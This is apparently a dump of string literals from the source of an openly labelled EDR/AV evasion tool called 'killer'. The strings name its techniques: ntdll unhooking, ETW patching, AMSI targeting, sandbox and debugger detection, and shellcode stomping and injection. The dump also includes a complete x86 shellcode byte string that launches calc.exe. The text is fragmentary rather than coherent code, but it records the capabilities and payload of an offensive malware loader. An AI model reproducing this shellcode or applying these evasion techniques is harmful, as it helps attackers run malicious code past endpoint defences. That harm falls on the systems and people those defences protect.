"""			     Author => Hossam Ehab / EDR/AV evasion tool\n"
"""			88     88 88 88        88         88         88     88   \n"
"""			88   `8b. 88 88        88         88         88   `8b.   \n"
"""			88.d8' 88 88        88         88         88    `8b		 \n"
"""			88aaa8P'  88 88        88        a88aaaa    a88aaaa8P'   \n"
"""			dP     dP dP 88888888P 88888888P  88888888P  dP     dP   \n"
"""   	        	dP     dP dP dP        dP         88888888b  888888ba    \n"
""" (different from "
""" GREEN "
""" NtAllocateVirtualMemory Hooked\n"
""" NtAllocateVirtualMemory Not Hooked"
""" NtAllocateVirtualMemory Not Hooked\n"
""" NtAllocateVirtualMemory is Hooked\n"
""" NtCreateThreadEx Not Hooked"
""" NtCreateThreadEx Not Hooked\n"
""" NtCreateThreadEx is Hooked\n"
""" NtProtectVirtualMemory Hooked\n"
""" NtProtectVirtualMemory Not Hooked"
""" NtProtectVirtualMemory Not Hooked\n"
""" NtProtectVirtualMemory is Hooked\n"
""" NtQueryInformationThread Hooked\n"
""" NtQueryInformationThread Not Hooked\n"
""" RED "
""" [!] "
""" [*] "
""" [+] "
""" [+]"
""" [-] Author => Hossam Ehab / An EDR (End Point Detection & Response) Evasion Tool "
""") # Notice that it adds one byte "
""");  nbHooks++; } else { PRINT_SUCCESS("
"""); nbHooks++;                } else { PRINT_SUCCESS("
"""); nbHooks++;   } else { PRINT_SUCCESS("
"""); nbHooks++; }   else { PRINT_SUCCESS("
"""); nbHooks++; } else { PRINT_SUCCESS("
"""); }   else { PRINT_SUCCESS("
"""); } else {	PRINT_SUCCESS("
""");}      else { PRINT_SUCCESS("
""")\n"
""", "
""".text"
"""0x%02x"
"""0x0 };"
"""0x0"
"""Copy ntdll to a fresh memory allocation and overwrite calls adresses, Detecting ntdll hooking : \n"
"""Debugger is not attach"
"""ETW patched !"
"""Failed to converting protection to RW (%u)\n"
"""Failed to load required system functions."
"""HOOKED"
"""Hit enter to run shellcode/payload without creating a new thread"
"""I got you sandbox, it's can't be run here :(\n"
"""NUMA memory allocate failed :( \n"
"""No hooked modules to unhook it!"
"""NtQueryInformationThread Not Hooked\n"
"""Original shellcode in hex format:\n"
"""Patching ETW 'Event Tracing for Windows' writer"
"""Restoring RX permission again"
"""Sandbox detected - Filename changed :( \n"
"""Sandbox rounds finished no sandbox detected ;)"
"""Shellcode & key Decrypted after stomping, Shellcode length: %d"
"""Shlwapi.lib"
"""The nonexistent file is detected !!! trying to exit"
"""Try to find .text section, sec name %s"
"""\033[0;31m"
"""\033[0;32m"
"""\033[0;34m"
"""\033[0m"
"""\033[1m"
"""\\x%02x"
"""\n"
"""\nReversed shellcode:\n"
"""\n[+] Detecting hooks in new ntdll module\n"
"""\t"
"""\tFirst bytes are HOOKED : "
"""\x4c\x8b\xd1\xb8"
"""\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
"""amsi.dll .text address = 0x%p"
"""amsi.dll"
"""argv"
"""converting protection to RW in ntdll"
"""failed to get a handle to %s\n"
"""kernel32.dll"
"""killer.exe"
"""moving the payload to the hollowed memory without using an APIs"
